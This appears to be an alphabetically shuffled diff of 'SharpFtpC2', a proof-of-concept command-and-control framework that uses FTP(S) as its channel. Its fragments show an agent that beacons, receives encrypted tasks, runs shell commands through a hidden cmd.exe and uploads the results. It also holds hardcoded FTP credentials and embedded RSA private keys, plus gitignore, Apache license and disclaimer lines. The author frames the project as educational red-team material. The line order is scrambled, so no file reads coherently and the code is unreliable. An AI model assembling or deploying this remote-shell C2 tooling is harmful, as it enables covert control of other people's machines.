+ TaskId 
+ TaskType { get
+ TeamCity is a build add-in
+ Telerik's JustMock configuration file
+ Terminate agent process.
+ The Story Behing The Project
+ The packages folder can be ignored because of Package Restore
+ Tout les codes sources et les projets partag
+ Twitter:       https://twitter.com/DarkCoderSc
+ Uid { get
+ Uncomment if necessary however generally it will be regenerated when needed
+ Uncomment if you have tasks that create the project's static files in wwwroot
+ UnpackRemoteFileName(string remoteFileName)
+ User { get
+ User-specific files
+ User-specific files (MonoDevelop/Xamarin Studio)
+ VS Code files for those working on multiple tools
+ VS Code tools) working folder
+ Version { get
+ Visual C
+ Visual Studio 2015/2017 cache/options directory
+ Visual Studio 2017 auto generated files
+ Visual Studio 6 auto-generated project file (contains which files were open etc.)
+ Visual Studio 6 auto-generated workspace file (contains which files were open etc.)
+ Visual Studio 6 build log
+ Visual Studio 6 technical files
+ Visual Studio 6 workspace and project file (working project files containing files to include in project)
+ Visual Studio 6 workspace options file
+ Visual Studio History (VSHistory) files
+ Visual Studio LightSwitch build output
+ Visual Studio Trace Files
+ Visual Studio Version 17
+ Visual Studio cache files
+ Visual Studio code coverage results
+ Visual Studio profiler
+ Web workbench (sass)
+ Website:       https://www.phrozen.io
+ Windows Installer files from build outputs
+ Windows Store app package directories and files
+ With TLS (Recommended)
+ Without TLS
+ WorkDir { get
+ WorkPath { get
+ action = Console.ReadLine()
+ actions = Console.ReadLine()
+ agent = JsonSerializer.Deserialize<Agent>(jsonData)
+ agent)
+ agent))
+ agent.Id == packedFileName.Session)
+ and
+ answer = Console.ReadLine()
+ because we have git 
+ but database connection strings (with potential passwords) will be unencrypted
+ but keep track of directories ending in .cache
+ bytes.Take(maxLength.Value) : bytes
+ cache files
+ de s'assurer que le code r
+ designed to streamline the application of the FTP protocol.
+ encodedPrivateKey) : this(
+ encryptedBundle = JsonSerializer.Deserialize<EncryptedBundle>(jsonText)
+ encryptionHelper)
+ est sujette 
+ files ending in .cache can be ignored
+ files generated by popular Visual Studio add-ons.
+ get
+ i < message.Length
+ i < table.Columns.Count
+ i < table.Rows.Count
+ in these scripts will be unencrypted
+ jour. Si l'utilisateur n'accepte pas les termes de cette clause de non-responsabilit
+ key = null
+ maxLength = null)
+ message[i 
+ message[i] == '
+ modification sans pr
+ n < values.Length
+ obj) =>
+ option allows you to fine-tune the pure-ftpd server. Explanations for all the flags can be found [here](https://linux.die.net/man/8/pure-ftpd).
+ or 
+ parameters.Exponent != null
+ plainText = Console.ReadLine()
+ pour les probl
+ pour tous dommages ou pertes pouvant r
+ privateKey == null)
+ privateKey)
+ project that showcases the technique
+ pubSignature = encryptionHelper
+ report files from converting an old project file
+ response = null
+ set
+ task = null
+ tools/
+ unwrappedTask = JsonSerializer.Deserialize<TaskCommand>(jsonData)
+ unwrappedTask = JsonSerializer.Deserialize<TaskShellCommand>(jsonData)
+ uri)
+ value))
+ within the Source form or
+ wrappedResponse = JsonSerializer.Deserialize<ResponseWrapper>(jsonData)
+ wrappedTask = JsonSerializer.Deserialize<TaskWrapper>(jsonData)
+ wrappedTask.Id != packedFileName.Uid)
+ }     
+ }        
+! :Y
+!.axoCover/settings.json
+!.vscode/extensions.json
+!.vscode/launch.json
+!.vscode/settings.json
+!.vscode/tasks.json
+![Agent](Assets/Images/agent.png)
+![Banner Image](Assets/Images/RSAKeyHelper_1.png)
+![Banner Image](Assets/Images/RSAKeyHelper_2.png)
+![Command](Assets/Images/command.png)
+![Main](Assets/Images/main.png)
+"                                                        "")"
+"                                        throw new Exception(""Task Action Denied by End-user."")"
+"                                    "")"
+"                                    UX.DisplayWarning($""Task("
+"                                   "")"
+"                                 "")"
+"                               "")"
+"                              "")"
+"                             "")"
+"                            "")"
+"                            agentProto.RegisterNewResponse(response, task.Id)"
+"                            responses.TryAdd(packedFileName.Uid.Value, response)"
+"                            throw new IndexOutOfRangeException($""Response Id("
+"                           Version 2.0, January 2004"
+"                         "")"
+"                        UX.DisplayInfo($""Process new task("
+"                        agents.AddOrUpdate(agent.Id, agent, (key, oldValue) => agent)"
+"                        case ""ResponseNotification"":"
+"                        case ""ResponseShellCommand"":"
+"                        case ""TaskCommand"":"
+"                        case ""TaskShellCommand"":"
+"                        if (TaskResponses.TryGetValue(responseId, out ResponseWrapper"
+"                        throw new FormatException(""File is corrupted or invalid."")"
+"                        throw new FormatException($""'{arg.Value}' is not a valid GUID."")"
+"                        throw new FormatException($""Session GUID expected but not found for file "
+"                        throw new IndexOutOfRangeException($""Agent Id("
+"                     "")"
+"                    //  In the event of a malformed agent, it is crucial to remove it"
+"                    //  In the event of a malformed task response, it is crucial to remove it"
+"                    //  a constant loop with each iteration, which would lead to unwarranted"
+"                    // Before registering the new task, it is mandatory to remove the existing"
+"                    // Signal C2, we are still active."
+"                    // possibly corrupted task file on the remote server, which could adversely affect"
+"                    Arguments = ""/c "" "
+"                    Console.Write("""
+"                    Console.Write(message.Substring(i, j - i))"
+"                    Console.Write(message.Substring(lastIndex, i - lastIndex))"
+"                    Console.WriteLine(""EOF"")"
+"                    CreateNoWindow = true,"
+"                    FileName = ""cmd.exe"", // sh / bash etc.. (TODO: Dynamic)"
+"                    RedirectStandardError = true,"
+"                    RedirectStandardOutput = true,"
+"                    RegisterNewCommandTask(TaskCommand.CommandKind.TerminateAgent, ActiveAgent)"
+"                    RegisterNewTask(task, ActiveAgent)"
+"                    Thread.Sleep(new Random().Next(BeaconDelayMin, BeaconDelayMax))"
+"                    UX.ColorBackTicks($""Command: "
+"                    UX.DisplayError($""@DaemonBeaconThread: {ex.Message}"")"
+"                    UX.DisplayError($""@DaemonProbeThread: {ex.Message}"")"
+"                    UX.DisplayError($""@DaemonSynchronizeThread: {ex.Message}"")"
+"                    UX.DisplayError($""@DaemonTasksThread: {ex.Message}"")"
+"                    UX.DisplayInfo(""No agent so far."")"
+"                    UX.DisplayInfo(""No result so far."")"
+"                    UX.DisplayWarning($"""
+"                    UseShellExecute = false,"
+"                    if (!CanProcessFile(packedFileName, SelfEncryptionHelper))"
+"                    if (Guid.TryParse(arg.Value, out Guid responseId))"
+"                    int j = message.IndexOf("""
+"                    int.TryParse(argument.Value(), out seconds)"
+"                    task.Command = string.Join("" "", args.Values)"
+"                    throw new FormatException($""'{arg.Value}' is not a valid GUID."")"
+"                   "")"
+"                Console.Write("" "")"
+"                Console.Write("""
+"                Console.Write(message.Substring(i, j - i))"
+"                Console.Write(message.Substring(lastIndex, i - lastIndex))"
+"                DisplayKeyValue(""Cipher AES Key"", FormatByteArrayAsString(cipherAesKey, 16))"
+"                DisplayKeyValue(""Nonce"", FormatByteArrayAsString(Nonce))"
+"                DisplayKeyValue(""Plain AES Key"", FormatByteArrayAsString(plainAesKey))"
+"                DisplayKeyValue(""Tag"", FormatByteArrayAsString(Tag))"
+"                List<KeyValuePair<Guid, Agent>> agentPairs = Agents.ToList()"
+"                Shared.PlaceHolders.AgentInformation,"
+"                Shared.PlaceHolders.ResponseRequest,"
+"                Shared.PlaceHolders.TaskRequest,"
+"                WriteLabel(""AES-GCM 256 Debug Information:"")"
+"                agentPairs.Sort((pair2, pair1) => pair1.Value.DateTime.CompareTo(pair2.Value.DateTime))"
+"                cmd.Description = ""Display a task response content by its id."""
+"                cmd.Description = ""Run a shell command."""
+"                cmd.Description = ""Terminate remote agent process."""
+"                cmd.HelpOption(""-"
+"                foreach (KeyValuePair<Guid, Agent> agentPair in agentPairs)"
+"                foreach (KeyValuePair<Guid, ResponseWrapper> entry in "
+"                foreach(KeyValuePair<Guid, ResponseWrapper> entry in TaskResponses)"
+"                if (Guid.TryParse(arg.Value, out Guid agentId))"
+"                int j = message.IndexOf("""
+"                null,"
+"                return $""{timeSpan.Days / 30} months ago"""
+"                return $""{timeSpan.Days / 365} years ago"""
+"                return $""{timeSpan.Days} days ago"""
+"                return $""{timeSpan.Hours} hours ago"""
+"                return $""{timeSpan.Minutes} minutes ago"""
+"                return $""{timeSpan.Seconds} seconds ago"""
+"                table.Columns.Add("""
+"                table.Columns.Add(""Display Name"")"
+"                table.Columns.Add(""Domain"")"
+"                table.Columns.Add(""Id"")"
+"                table.Columns.Add(""Is64Bit"")"
+"                table.Columns.Add(""Kind"")"
+"                table.Columns.Add(""Last Seen"")"
+"                table.Columns.Add(""Process Id"")"
+"                table.Columns.Add(""User@Computer"")"
+"                table.Columns.Add(""When"")"
+"                task.AgentId,"
+"                task.Id, // For file randomness                "
+"                taskId,"
+"                throw new ArgumentNullException(""id"")"
+"                throw new FormatException($"""
+"                var arg = cmd.Argument(""id"", ""Task response identifier"")"
+"                var args = cmd.Argument(""command"", ""Shell command"", true)"
+"               !@7                               "")"
+"            : base(host, username, password, secure)"
+"            AgentProtocol agentProto = new(FtpHost, FtpUser, FtpPwd, FtpSecure, AgentSession)"
+"            AgentTerminated,"
+"            C2Protocol c2Protocol = new(FtpHost, FtpUser, FtpPwd, FtpSecure)"
+"            Console.Write("" "")"
+"            Console.Write("""
+"            Console.Write(""Answer: "")"
+"            Console.Write(""plain text > "")"
+"            Console.Write($""] "")"
+"            Console.WriteLine($""[!] Before proceeding (Task: "
+"            Convert.FromBase64String(publicKey),"
+"            Data = cipherText,"
+"            DisplayNotification(message, '!', ConsoleColor.Yellow)"
+"            DisplayNotification(message, '"
+"            DisplayNotification(message, 'x', ConsoleColor.Red)"
+"            Key = cipherAesKey,"
+"            MatchCollection matches = Regex.Matches(value, pattern)"
+"            Name = remoteFileName,"
+"            Nonce = Nonce,"
+"            Session = session,"
+"            Tag = Tag,"
+"            TerminateAgent,            "
+"            UX.DisplaySuccess($""Task("
+"            Uid = uid,"
+"            UploadString(jsonAgent, remoteFileName)"
+"            UploadString(jsonData, remoteFileName)"
+"            Version = ProtocolVersion,"
+"            WriteLabel(""Ciphertext:"")"
+"            WriteLabel(""Plaintext:"")"
+"            WriteTitle(""Encryption / Decryption Tester"")"
+"            _RSA.ImportRSAPrivateKey(privateKey, out _)"
+"            _RSA.ImportRSAPublicKey(publicKey, out _)"
+"            agentProto.SetupSelfEncryptionHelper(EncodedPublicKey, EncodedPrivateKey)"
+"            c2Protocol.SetupSelfEncryptionHelper(EncodedPublicKey, EncodedPrivateKey)"
+"            cmd.Description = ""Clear console."""
+"            cmd.Description = ""Display remote agent tasks responses."""
+"            cmd.Description = ""Exit controller (Donnie Darko)."""
+"            cmd.Description = ""Exit current agent context."""
+"            cmd.Description = ""Interact with a registered agent."""
+"            cmd.Description = ""Makes main thread hanging for a defined amount of seconds (default: 1)."""
+"            cmd.Description = ""Show active agents."""
+"            cmd.Description = ""Show available commands."""
+"            cmd.HelpOption(""-"
+"            encryptedBundle.Data,"
+"            encryptedBundle.Key,"
+"            encryptedBundle.Nonce,"
+"            if (!uint.TryParse(argument.Value(), out uint value))"
+"            parser.Command(""exec"", cmd =>"
+"            parser.Command(""kill"", cmd =>"
+"            parser.Command(""results::show"", cmd =>"
+"            parser.Execute(action.Split("" ""))"
+"            return $""{this.User "
+"            return (cipherStream.ToArray(), cipherAesKey, aes.IV)"
+"            return upperAnswer == ""YES"" "
+"            string jsonData = JsonSerializer.Serialize(response, response.GetType())"
+"            string jsonData = JsonSerializer.Serialize(task, task.GetType())"
+"            string pattern = $""(["
+"            throw new CryptographicException(""No RSA Private Key Provided."")"
+"            throw new CryptographicException(""No RSA Public Key Provided."")"
+"            throw new CryptographicException(""You must specify at least a public key or a private key."")"
+"            using (CryptoStream cryptoStream = new(cipherStream, encryptor, CryptoStreamMode.Write))"
+"            var arg = cmd.Argument(""id"", ""Agent Id"")"
+"            var argument = cmd.Option(""-s"
+"          attribution notices from the Source form of the Work,"
+"          distribution, then any Derivative Works that You distribute must"
+"          documentation, if provided along with the Derivative Works"
+"          notices within Derivative Works that You distribute, alongside"
+"          or as an addendum to the NOTICE text from the Work, provided"
+"          pertain to any part of the Derivative Works, in at least one"
+"          that You distribute, all copyright, patent, trademark, and"
+"          within a display generated by the Derivative Works, if and"
+"          within such NOTICE file, excluding those notices that do not"
+"        // An ""enum"" would also do the job."
+"        // Encrypt plain-text using our setup, an authentication tag will get returned."
+"        // However, it is strongly advised not to employ this approach in a production environment"
+"        // To achieve this, only the ""RegisterOrUpdateAgent"" method is invoked at regular intervals,"
+"        // Typically, generating a random nonce is discouraged due to the risk of nonce collision (which is generally very unlikely)"
+"        // When triggered, it will instruct any associated cancellation tokens to properly"
+"        // random AES key and the probability of a key/nonce collision is negligibly low, this approach doesn't present any significant"
+"        // when using the same AES key, as this can compromise security. However, in this scenario, because we are using a one-time"
+"        //var drawLine = () => Console.WriteLine("""
+"        Action drawLine = () => Console.WriteLine("""
+"        Console.Write("" > "")"
+"        Console.Write("""
+"        Console.Write(""= "")"
+"        Console.Write(""] > "")"
+"        Console.Write(""controller"")"
+"        Console.Write($""({agent.Domain})["")"
+"        Console.Write($""] "")"
+"        Console.Write($""{agent.User}@"")"
+"        Console.Write($""{key} : "")"
+"        Console.WriteLine(""                                                                                "")"
+"        Console.WriteLine(""                                 "
+"        Console.WriteLine(""                                (@DarkCoderSc)                                  "")"
+"        Console.WriteLine(""                                YJP"
+"        Console.WriteLine(""                               "
+"        Console.WriteLine(""                              "
+"        Console.WriteLine(""                              7"
+"        Console.WriteLine(""                             BP              !P5                                "")"
+"        Console.WriteLine(""                            G@@@5:G"
+"        Console.WriteLine(""                            J"
+"        Console.WriteLine(""                           :"
+"        Console.WriteLine(""                          !G"
+"        Console.WriteLine(""                          "
+"        Console.WriteLine(""                         "
+"        Console.WriteLine(""                         J@Y:G@@@@@@"
+"        Console.WriteLine(""                         SharpFtpC2 (PoC) - JUL 2023                            "")"
+"        Console.WriteLine(""                        "
+"        Console.WriteLine(""                        :G@!"
+"        Console.WriteLine(""                        :YB"
+"        Console.WriteLine(""                        G@@"
+"        Console.WriteLine(""                        J"
+"        Console.WriteLine(""                        Y@"
+"        Console.WriteLine(""                      7"
+"        Console.WriteLine(""                     https://www.github.com/DarkCoderSc                         "")"
+"        Console.WriteLine(""                    "
+"        Console.WriteLine(""                    If the sky were to suddenly open up,                        "")"
+"        Console.WriteLine(""                   "
+"        Console.WriteLine(""                  There would only be you and your memories.                    "")"
+"        Console.WriteLine(""                there would be no law, there would be no rule.                  "")"
+"        Console.WriteLine("" ="")"
+"        Console.WriteLine(""Type some text to encrypt ("
+"        Console.WriteLine($""@{label}"")"
+"        DisplayKeyValue(""Private Key Guid Fingerprint"", encryptionHelper.GetPrivateKeyFingerprint().ToString() "
+"        DisplayKeyValue(""Public Key Fingerprint"", ComputeFingerprint(privateKey))"
+"        DisplayKeyValue(""Public Key Fingerprint"", ComputeFingerprint(publicKey))"
+"        DisplayKeyValue(""Public Key Guid Fingerprint"", encryptionHelper.GetPublicKeyFingerprint().ToString() "
+"        DisplayNotification(message, '!', ConsoleColor.Yellow)"
+"        DisplayNotification(message, '"
+"        DisplayNotification(message, 'x', ConsoleColor.Red)"
+"        FtpWebRequest request = (FtpWebRequest)WebRequest.Create($""ftp://{this.Host}/{uri "
+"        ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV)"
+"        ICryptoTransform encryptor = aes.CreateEncryptor(aes.Key, aes.IV)"
+"        PeerEncryptionHelper = new(Convert.FromBase64String(publicKey), null)"
+"        RegisterNewTask(taskCommand, agentId)"
+"        UX.DisplayInfo($""Agent Id: "
+"        UploadData(fileStream, destFilePath)"
+"        UploadData(stream, destFilePath)"
+"        WriteLabel(""EOF"")"
+"        WriteLabel(""PrivKey:"")"
+"        WriteLabel(""PubKey:"")"
+"        WriteTitle(""Generated RSA Key Pair"")"
+"        _ExecuteFTPCommand(remoteDirectoryPath, WebRequestMethods.Ftp.DeleteFile)"
+"        _ExecuteFTPCommand(remoteDirectoryPath, WebRequestMethods.Ftp.MakeDirectory)"
+"        aes.Decrypt(nonce, cipherText, authenticatinTag, plainText)"
+"        aes.Encrypt(nonce, plainText, cipherText, tag)"
+"        byte[] Nonce,"
+"        byte[] cipherAesKey,"
+"        byte[] plainAesKey,"
+"        if (!Agents.TryGetValue(ActiveAgent, out Agent"
+"        parser.Command(""agents"", cmd =>"
+"        parser.Command(""clear"", cmd =>"
+"        parser.Command(""exit"", cmd =>"
+"        parser.Command(""help"", cmd =>"
+"        parser.Command(""results"", cmd =>"
+"        parser.Command(""use"", cmd =>"
+"        parser.Command(""wait"", cmd =>"
+"        parser.Execute(action.Split("" ""))"
+"        privateKey,"
+"        public AgentProtocol(string host, string username, string password, bool secure, Guid session)"
+"        public C2Protocol(string host, string username, string password, bool secure)"
+"        public HttpError404() : base(""404 Not Found"") { }"
+"        public HttpError405() : base(""405 Method Not Allowed"") { }"
+"        public const string AgentInformation = ""__agent__"""
+"        public const string ResponseRequest = ""__respreq__"""
+"        public const string TaskRequest = ""__taskreq__"""
+"        public static string[] SplitEx(string value, string needle = @"""
+"        public static void DisplayNotification(string message, char icon, ConsoleColor color)"
+"        public virtual string DisplayName() { return """""
+"        public void RegisterNewResponse(ResponseWrapper response, Guid taskId)"
+"        publicKey,"
+"        request.Credentials = new NetworkCredential(this.Username, this.Password)"
+"        return (cipherText, cipherAesKey, nonce, tag)"
+"        return (publicKey, privateKey)"
+"        return _RSA.Decrypt(encryptedData, RSAEncryptionPadding.OaepSHA256)"
+"        return _RSA.Encrypt(plainTextData, RSAEncryptionPadding.OaepSHA256)"
+"        string formatedByteString = string.Join("":"", candidates.Select(b => b.ToString(""x2"")))"
+"        string jsonData = JsonSerializer.Serialize(packedFilename, packedFilename.GetType())"
+"        string line = new('=', title.Length "
+"        this.FTP = new(host, username, password, secure)"
+"        this.FTP.UploadString(content, destFilePath)"
+"        using AsymEncryptionHelper encryptionHelper = new(publicKey, privateKey)"
+"        using CryptoStream plainStream = new(cipherStream, decryptor, CryptoStreamMode.Read)"
+"        using FileStream fileStream = File.Open(localFilePath, FileMode.Open, FileAccess.Read)"
+"        using FileStream fileStream = new(destinationFilePath, FileMode.Create, FileAccess.Write)"
+"        var (cipherText, cipherAesKey, Nonce, Tag) = Encrypt(plainTextData)"
+"        var (publicKey, privateKey) = AsymEncryptionHelper.GenerateRSAKeyPair(4096)"
+"      ""Contribution"" shall mean any work of authorship, including"
+"      ""Contributor"" shall mean Licensor and any individual or Legal Entity"
+"      ""Derivative Works"" shall mean any work, whether in Source or Object"
+"      ""Legal Entity"" shall mean the union of the acting entity and all"
+"      ""License"" shall mean the terms and conditions for use, reproduction,"
+"      ""Licensor"" shall mean the copyright owner or entity authorized by"
+"      ""Object"" form shall mean any form resulting from mechanical"
+"      ""Source"" form shall mean the preferred form for making modifications,"
+"      ""Work"" shall mean the work of authorship, whether in Source or"
+"      ""You"" (or ""Your"") shall mean an individual or Legal Entity"
+"      ""control"" means (i) the power, direct or indirect, to cause the"
+"      (c) You must retain, in the Source form of any Derivative Works"
+"      (d) If the Work includes a ""NOTICE"" text file as part of its"
+"      (except as stated in this section) patent license to make, have made,"
+"      Contributor provides its Contributions) on an ""AS IS"" BASIS,"
+"      License. However, in accepting such obligations, You may act only"
+"      Licensor for the purpose of discussing and improving the Work, but"
+"      Notwithstanding the above, nothing herein shall supersede or modify"
+"      Object form, made available under the License, as indicated by a"
+"      To apply the Apache License to your work, attach the following"
+"      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or"
+"      Work (including but not limited to damages for loss of goodwill,"
+"      Work or Derivative Works thereof in any medium, with or without"
+"      agreed to in writing, Licensor provides the Work (and each"
+"      and charge a fee for, acceptance of support, warranty, indemnity,"
+"      and issue tracking systems that are managed by, or on behalf of, the"
+"      boilerplate notice, with the fields enclosed by brackets ""[]"""
+"      communication on electronic mailing lists, source code control systems,"
+"      control with that entity. For the purposes of this definition,"
+"      copyright license to reproduce, prepare Derivative Works of,"
+"      defend, and hold each Contributor harmless for any liability"
+"      designated in writing by the copyright owner as ""Not a Contribution."""
+"      direction or management of such entity, whether by contract or"
+"      editorial revisions, annotations, elaborations, or other modifications"
+"      for any such Derivative Works as a whole, provided Your use,"
+"      for use, reproduction, or distribution of Your modifications, or"
+"      form, that is based on (or derived from) the Work and for which the"
+"      implied, including, without limitation, any warranties or conditions"
+"      incidental, or consequential damages of any character arising as a"
+"      including but not limited to software source code, documentation"
+"      incurred by, or claims asserted against, such Contributor by reason"
+"      liable to You for damages, including any direct, indirect, special,"
+"      means any form of electronic, verbal, or written communication sent"
+"      modifications, and in Source or Object form, provided that You"
+"      names, trademarks, service marks, or product names of the Licensor,"
+"      negligent acts) or agreed to in writing, shall any Contributor be"
+"      not limited to compiled object code, generated documentation,"
+"      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A"
+"      of any other Contributor, and only if You agree to indemnify,"
+"      of this License, Derivative Works shall not include works that remain"
+"      on Your own behalf and on Your sole responsibility, not on behalf"
+"      or contributory patent infringement, then any patent licenses"
+"      other commercial damages or losses), even if such Contributor"
+"      other entities that control, are controlled by, or are under common"
+"      otherwise, or (ii) ownership of fifty percent (50%) or more of the"
+"      outstanding shares, or (iii) beneficial ownership of such entity."
+"      publicly display, publicly perform, sublicense, and distribute the"
+"      represent, as a whole, an original work of authorship. For the purposes"
+"      reproduction, and distribution of the Work otherwise complies with"
+"      same ""printed page"" as the copyright notice for easier"
+"      separable from, or merely link (or bind by name) to the interfaces of,"
+"      source, and configuration files."
+"      the Work or Derivative Works thereof, You may choose to offer,"
+"      the copyright owner. For the purposes of this definition, ""submitted"""
+"      this License, each Contributor hereby grants to You a perpetual,"
+"      this License, without any additional terms or conditions."
+"      to that Work or Derivative Works thereof, that is intentionally"
+"      to the Licensor or its representatives, including but not limited to"
+"      transformation or translation of a Source form, including but"
+"      use, offer to sell, sell, import, and otherwise transfer the Work,"
+"      whether in tort (including negligence), contract, or otherwise,"
+"      work stoppage, computer failure or malfunction, or any and all"
+"      worldwide, non-exclusive, no-charge, royalty-free, irrevocable"
+"    // Ensure that this contains the RSA Public / Private Key for C2, which is used to decrypt data received"
+"    // Ensure that this contains the RSA Public / Private Key for the Agent, which is used to decrypt data received"
+"    // If the protocol has evolved and is no longer backward compatible with previous versions,"
+"    // If you require a unique identifier for each machine/user, it is advisable to replace this code"
+"    // In this Proof of Concept (PoC), the ""AgentSession"" GUID changes with each process instance."
+"    // Make sure this includes the RSA Public Key belonging to the C2, which is utilized for encrypting"
+"    // Make sure this includes the RSA Public Key belonging to the remote agent, which is utilized for encrypting"
+"    // protocol and the Command and Control (C2) protocol don't align, the agent will be disregarded."
+"    <Compile Include="".."
+"    <Folder Include=""Responses"
+"    <Folder Include=""Tasks"
+"    <PackageReference Include=""Microsoft.Extensions.CommandLineUtils"" Version=""1.1.1"" />"
+"    <img src=""Assets/Images/icon.png"" width=256/>"
+"    private const string ProtocolVersion = ""3.0.F"""
+"    private static void RegisterNewCommandTask(TaskCommand.CommandKind command, Guid agentId)"
+"    private static void RegisterNewTask(TaskWrapper taskRequest, Guid agentId)"
+"    private void _ExecuteFTPCommand(string remoteDirectoryPath, string command)"
+"    protected bool CanProcessFile(PackedFileName packedFileName, AsymEncryptionHelper"
+"    protected string PackRemoteFileName(string remoteFileName, Guid session, Guid"
+"    public (byte[] cipherText, byte[] cipherAesKey, byte[] Nonce, byte[] Tag) Encrypt(byte[] plainText)"
+"    public FtpHelper(string host, string username, string password, bool secure)"
+"    public List<string> ListDirectory(string remoteDirectoryPath = """")"
+"    public ProtocolBase(string host, string username, string password, bool secure)"
+"    public byte[] Decrypt(byte[] cipherText, byte[] cipherAesKey, byte[] nonce, byte[] authenticatinTag)"
+"    public static (byte[] publicKey, byte[] privateKey) GenerateRSAKeyPair(int keyLength = 4096)"
+"    public static readonly string EncodedPeerPublicKey = ""MIICCgKCAgEA6"
+"    public static readonly string EncodedPeerPublicKey = ""MIICCgKCAgEAwCgvEs3M3Xq9VsIokZcJCiZJBIvnpDsBh"
+"    public static readonly string EncodedPrivateKey = ""MIIJJwIBAAKCAgEA6"
+"    public static readonly string EncodedPrivateKey = ""MIIJKAIBAAKCAgEAwCgvEs3M3Xq9VsIokZcJCiZJBIvnpDsBh"
+"    public static readonly string EncodedPublicKey = ""MIICCgKCAgEA6"
+"    public static readonly string EncodedPublicKey = ""MIICCgKCAgEAwCgvEs3M3Xq9VsIokZcJCiZJBIvnpDsBh"
+"    public static readonly string FtpHost = ""127.0.0.1"""
+"    public static readonly string FtpPwd = ""toor"""
+"    public static readonly string FtpUser = ""dark"""
+"    public static string FormatByteArrayAsString(byte[] bytes, int"
+"    public static void DisplayKeyValue(string key, string value, ConsoleColor color = ConsoleColor.Green)"
+"    public static void DisplayNotification(string message, char icon, ConsoleColor color)"
+"    public void DownloadFile(string remoteFilePath, string destinationFilePath)"
+"    public void SetupSelfEncryptionHelper(string publicKey, string privateKey)"
+"    public void UploadData(Stream data, string destFilePath)"
+"    public void UploadFile(string localFilePath, string destFilePath)"
+"    public void UploadString(string content, string destFilePath)"
+"   5. Submission of Contributions. Unless You explicitly state otherwise,"
+"   8. Limitation of Liability. In no event and under no legal theory,"
+"   Licensed under the Apache License, Version 2.0 (the ""License"")"
+"   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION"
+"   Unless required by applicable law or agreed to in writing, software"
+"   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."
+"   distributed under the License is distributed on an ""AS IS"" BASIS,"
+" """")"
+" """"}"")"
+" ""NULL"""
+" ""Unknown""}"""
+" ""Unknown""}@{this.Computer "
+" 5J                               "")"
+" All source code and projects shared on this Github account by Jean-Pierre LESUEUR and his company, PHROZEN SAS, are provided ""as is"" without warranty of any kind, either expressed or implied. The user of this code assumes all responsibility for any issues or legal liabilities that may arise from the use, misuse, or distribution of this code. The user of this code also agrees to release Jean-Pierre LESUEUR and PHROZEN SAS from any and all liability for any damages or losses that may result from the use, misuse, or distribution of this code."
+" Convert.FromBase64String(encodedPublicKey) : null,"
+" Coverlet is a free, cross platform Code Coverage Tool"
+" Each time you run the application, it will present you with a freshly generated pair of public and private keys, which can be utilized within the program if you opt to employ encryption."
+" Guid.Empty,"
+" Ignore Visual Studio temporary files, build results, and"
+" Note: Comment the next line if you want to checkin your web deploy settings,"
+" Since there are multiple workflows, uncomment next line to ignore bower_components"
+" Understanding the implications, please type "
+" Y!                              "")"
+" and .NET Core, SharpFtpC2 might be an intriguing starting point. Don't expect a polished gem, but maybe, just maybe, you might learn something interesting from tinkering with it."
+" checkin your Azure Web App publish settings, but sensitive information contained"
+" commandLine,"
+" encodedPublicKey, string"
+" except build/, which is used as an MSBuild target."
+" file = """""
+" is not a valid positive integer value."")"
+" is unknown."")"
+" new string('-', headerLength) "
+" option to retain all files, the ability to delete files via FTP will be disabled. Since the current C2 protocol utilizes this feature, you might need to contemplate alternative approaches, such as file renaming or moving."
+" or,"
+" plainText == ""exit"")"
+" publicKey, byte[]"
+" result is not implemented or necessary."")"
+" sender, EventArgs e)"
+" the objective of this PoC was to demonstrate the creation of a reliable and secure C2 utilizing FTP(S). You're encouraged to develop your own version with tailored functionalities. As an exercise, you might consider implementing multi-threading tasking to prevent the application from hanging during long-duration tasks."
+" to a newer Visual Studio version. Backup files are not needed,"
+" to confirm or anything else to abort the action."")"
+" to terminate the program)"")"
+" uid, AsymEncryptionHelper"
+" upperAnswer == ""Y"""
+"!@G:                             "")"
+""" />"
+""" successfully processed."")"
+""", i)"
+"""."")"
+"""{file}"
+"""{response.DisplayName()}"
+"', ConsoleColor.DarkCyan)"
+"', ConsoleColor.Green)"
+") not found."")"
+"), please be aware that the action you are about to perform has the potential to be dangerous and may have unintended consequences. This tool is intended for educational purposes and should be used responsibly. Are you sure you want to proceed"
+", Adversary Simulation, Red Team, Malware. As the creator, I urge users not to make requests for additional functionalities or use this project for any form of weaponization or malicious intent. The core intention is educational, and users are expected to engage with the content responsibly and ethically."
+", PHROZEN SAS, sont fournis ""tels quels"" sans aucune garantie, expresse ou implicite. L'utilisateur de ce code assume toute responsabilit"
+", il ne doit pas utiliser ce code."
+", which, despite being lost to time, was rather avant-garde for its era. "
+"- Protocol Improvement: The communication protocol has been enhanced and is now more modular, allowing for greater flexibility."
+"- Protocol version checking between the Command and Control (C2) and Agent(s) has been incorporated. If a protocol version mismatch is detected, the agent will be disregarded by the C2."
+"- Support for Different RSA Key-Pairs: C2 and agents can now operate with different RSA key-pairs, enabling them to coexist without conflict on the same FTP server."
+"- Support for encryption has been introduced, utilizing RSA and AES-GCM 256-bit algorithms, to safeguard the integrity and confidentiality of communications between agents and the C2 server."
+"--help"")"
+"--seconds"", ""Seconds to wait"", CommandOptionType.SingleValue)"
+"..."")"
+".GetPublicKeyFingerprint(),"
+".Invoke(aes.KeySize, aes.Mode, aes.Key, cipherAesKey, aes.IV)"
+".Invoke(aes.KeySize, aes.Mode, aesKey, cipherAesKey, aes.IV)"
+".Invoke(aesKey, cipherAesKey, nonce, authenticatinTag)"
+".Invoke(aesKey, cipherAesKey, nonce, tag)"
+"/, Agent> Agents = new()"
+"/, Agent> agents)"
+"/, ResponseWrapper> TaskResponses = new()"
+"/, ResponseWrapper> responses)"
+"/// This is accomplished through abstraction and simplification of the built-in WebRequest class,"
+"7@@@G:                                "")"
+":                                "")"
+":7                              "")"
+"<Project Sdk=""Microsoft.NET.Sdk"">"
+"<p align=""center"">"
+"= ""...more..."""
+"= (plainAesKey, cipherAesKey, Nonce, Tag) =>"
+"= (sender, cancelEventArgs) =>"
+"@P                             "")"
+"Agent.cs"" Link=""Agent.cs"" />"
+"As this project utilizes .NET Core, it can be compiled for various platforms with ease, without necessitating any code modifications. However, you may need to implement specific features tailored to the target platform."
+"AsymEncryptionHelper.cs"" Link=""AsymEncryptionHelper.cs"" />"
+"B!7                                      "")"
